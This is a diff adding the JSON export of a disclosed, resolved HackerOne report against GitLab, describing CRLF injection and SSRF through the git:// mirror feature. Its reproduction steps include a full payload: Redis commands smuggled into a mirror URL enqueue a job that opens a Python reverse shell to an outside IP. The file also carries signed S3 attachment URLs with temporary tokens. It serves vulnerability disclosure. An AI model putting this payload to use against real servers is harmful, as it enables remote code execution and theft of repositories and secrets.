@@ -1,0 +1,343 @@
+{
+  "id": 441090,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDEwOTA=",
+  "url": "https://hackerone.com/reports/441090",
+  "title": "CRLF injection & SSRF in git:// protocal lead to arbitrary code execution",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-11-15T05:33:36.293Z",
+  "submitted_at": "2018-11-15T05:33:36.293Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "chromium1337",
+    "url": "/chromium1337",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/kj4qb0hd3slvns8xbi40dujkp3ww/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-11-23T16:07:44.869Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-23T16:07:44.737Z",
+  "team_member_agreed_on_going_public_at": "2020-11-23T15:25:38.819Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nThe implementation of `git://` protocal in GitLab is vulnerable to CRLF injection and Server-Side Request Forgery. If the redis server is configured to listen on TCP socket (eg. port 6379), an attacker can abuse SSRF to manipulate redis server, injecting malicious payload into system_hook_push queue, which result in arbitrary code execution.\n\n**Description:** \nThis vulnerability is similar to @jobert 's https://hackerone.com/reports/299473 . GitLab patched the CRLF injection in HTTP header and introduced the UrlBlocker module to prevent HTTP requests going into intranet. But `git://` is not restricted to the UrlBlocker. \nThis gif shows a request sent to 127.0.0.1:2333 with multiple CRLF injected:\n{F375843}\n\n## Steps To Reproduce:\n  1. Follow [GitLab Docs](https://docs.gitlab.com/omnibus/settings/redis.html) to set up a redis server listening on `127.0.0.1:6379`\n  2. Sign in and create a project, go to project Settings -> Repository -> Mirroring repositories\n  3. Add a mirror repo, capture the POST request using BurpSuite or Fiddler or whatever you like, and modify the post param `project[remote_mirrors_attributes][0][url]` to:\n\n```\ngit://127.0.0.1:6379/\n multi\n sadd resque:gitlab:queues system_hook_push\n lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|/usr/bin/python3 -c \\\\\\\\\\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\"118.89.198.146\\\\\\\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\\\\\"/bin/sh\\\\\\\",\\\\\\\"-i\\\\\\\"]);\\\\\\\\\\'\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\"\n exec\n/bbbbb/ccccc\n```\n\n(Thanks to @jobert 's [payload](https://hackerone.com/reports/299473) again!)\n\n  4. Make a POST request to `/{username}/{project name}/mirror/update_now?sync_remote=true` to trigger the mirror action\n  5. Attacker will receive a reverse shell on 118.89.198.146 port 8000\n\n{F375845}\n\n## Impact\n\nSame as https://hackerone.com/reports/299473:\n> An attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 375843,
+      "file_name": "2.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/375/843/ff9414fa50e54c353c4983810a8ac76a27651d38/2.gif?response-content-disposition=attachment%3B%20filename%3D%222.gif%22%3B%20filename%2A%3DUTF-8%27%272.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072044Z&X-Amz-Expires=3385&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b455f7972c27fb8cb11f88918f2b249d25d17465825b406ff2f84c0c72a2f219",
+      "file_size": 1128937,
+      "type": "image/gif",
+      "moderated": null
+    },
+    {
+      "id": 375845,
+      "file_name": "1.gif",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/375/845/11ff78f18d7a673322f22ec289b1206e583550d0/1.gif?response-content-disposition=attachment%3B%20filename%3D%221.gif%22%3B%20filename%2A%3DUTF-8%27%271.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072044Z&X-Amz-Expires=3385&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d09ad4f3fdaf3200f9eb6f5e48690ea99119518ecf90ddc09b51bac9287e4065",
+      "file_size": 207021,
+      "type": "image/gif",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 19,
+  "voters": [
+    "porcupineyhairs",
+    "th3hidd3nmist",
+    "ph03ni6",
+    "xploiterr",
+    "sameerphad72",
+    "ali",
+    "mik317",
+    "aryan2808",
+    "h4x0r_dz",
+    "aporlorxl23",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 3646588,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @chromium1337,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 14 business days with an update.\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2018-11-15T06:24:16.966Z",
+      "updated_at": "2018-11-15T06:24:16.966Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 3647815,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hi @chromium1337,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team. We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab-ee/issues/8438. This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nDennis\nSecurity Team | GitLab Inc.\n",
+      "automated_response": false,
+      "created_at": "2018-11-15T12:58:01.380Z",
+      "updated_at": "2018-11-15T12:58:01.380Z",
+      "actor": {
+        "username": "dappelt",
+        "cleared": false,
+        "verified": false,
+        "url": "/dappelt",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 3657125,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @chromium1337,\n\nthank you again for your report. I sent you an invitation to our VIP program along with instructions on how to get a reward.\n\nBest regards,\nDennis",
+      "automated_response": false,
+      "created_at": "2018-11-16T09:35:50.665Z",
+      "updated_at": "2018-11-16T09:35:50.665Z",
+      "actor": {
+        "username": "dappelt",
+        "cleared": false,
+        "verified": false,
+        "url": "/dappelt",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 3657188,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @dappelt, I've followed the instructions to create a reference to this in #442647 . \nThanks :P",
+      "automated_response": false,
+      "created_at": "2018-11-16T09:52:12.783Z",
+      "updated_at": "2018-11-16T09:52:12.783Z",
+      "actor": {
+        "username": "chromium1337",
+        "cleared": false,
+        "verified": false,
+        "url": "/chromium1337",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/kj4qb0hd3slvns8xbi40dujkp3ww/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 3735760,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @chromium1337 ,\n\nThanks again for the great find. We are closing this as the fix was released in our latest [security release](https://about.gitlab.com/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/).\n\nWe're looking forward to the next report!\nEthan\nSecurity Team | GitLab",
+      "automated_response": false,
+      "created_at": "2018-11-29T23:03:01.800Z",
+      "updated_at": "2018-11-29T23:03:01.800Z",
+      "actor": {
+        "username": "estrike",
+        "cleared": false,
+        "verified": false,
+        "url": "/estrike",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "chromium1337",
+        "url": "/chromium1337"
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 9900303,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "@chromium1337 Do you mind if this report is published? If any part of your report contains sensitive data, we can publish just a summary.",
+      "automated_response": false,
+      "created_at": "2020-11-23T15:25:38.848Z",
+      "updated_at": "2020-11-23T15:25:38.848Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "dappelt",
+        "cleared": false,
+        "verified": false,
+        "url": "/dappelt",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 9901060,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-11-23T16:07:44.754Z",
+      "updated_at": "2020-11-23T16:07:44.754Z",
+      "actor": {
+        "username": "chromium1337",
+        "cleared": false,
+        "verified": false,
+        "url": "/chromium1337",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/kj4qb0hd3slvns8xbi40dujkp3ww/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 9901062,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-11-23T16:07:44.889Z",
+      "updated_at": "2020-11-23T16:07:44.889Z",
+      "actor": {
+        "username": "chromium1337",
+        "cleared": false,
+        "verified": false,
+        "url": "/chromium1337",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/kj4qb0hd3slvns8xbi40dujkp3ww/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
